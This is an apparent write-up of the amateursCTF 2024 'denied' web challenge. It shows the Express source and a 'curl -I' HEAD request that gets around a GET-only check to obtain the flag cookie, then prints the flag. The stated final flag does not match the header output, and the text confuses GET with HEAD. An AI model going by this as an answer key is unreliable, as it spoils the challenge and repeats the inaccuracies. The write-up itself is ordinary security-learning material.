<title>denied-  amateurctf2024</title>

<!DOCTYPE html>
<html>

<body>
    <h1>denied-  amateurctf2024</h1>

    <h2>Challenge Description</h2>
    <p> 
 what options do i have?
<a href="http://denied.amt.rs
">http://denied.amt.rs
Downloads

<a href="https://storage.amateurs.team/uploads/b09db84f4e57f8fbf39c2afb235f13e1ebf780b4833a13ba08e7afdf08e09622/index.js">index.js</a>
</a>
</p>
 
    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
    <ol>
       i open site see only bad so download index.js and see script 
       <p id="code1">
const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => {
  if (req.method == "GET") return res.send("Bad!");
  res.cookie('flag', process.env.FLAG ?? "flag{fake_flag}")
  res.send('Winner!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})

    </p>
    it seems that with get request we can get flag in flag cookie 
best options is use($1=http://denied.amt.rs/)
<pre>
$curl -I $1
</pre>
that show all details of url and reguest get like below
<p id="code1">
──(kali㉿kali)-[~/…/blog/2024/amateursctf/denied]
└─$ curl -I http://denied.amt.rs/
HTTP/1.1 200 OK
Content-Length: 7
Content-Type: text/html; charset=utf-8
Date: Wed, 10 Apr 2024 07:33:49 GMT
Etag: W/"7-skdQAtrqJAsgWjDuibJaiRXqV44"
Server: Caddy
Set-Cookie: flag=amateursCTF%7Bs0_m%40ny_0ptions...%7D; Path=/
X-Powered-By: Express
</p>
flag is in url encoded that should decoded and ge flag
    </ol>
<br>
    <h2>Flag</h2>
    <p class="flag">amateursCTF{Bs0_m%40ny_0ptions...}
</p>

    <h2>Conclusion</h2>
    <p>this is a very   easy chanllenge for work on curl and javascript and get cookie with curl</p>
</body>
</html>



